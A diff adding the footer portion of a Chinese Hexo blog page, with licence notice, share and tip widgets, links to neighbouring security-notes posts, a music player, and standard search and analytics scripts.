+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../bi-ji-1.6-an-quan-ruan-jian-fen-xi-si-wei-dao-xiang-xia/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../bi-ji-1.31-bypass-uac-ti-quan-yuan-li-er/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
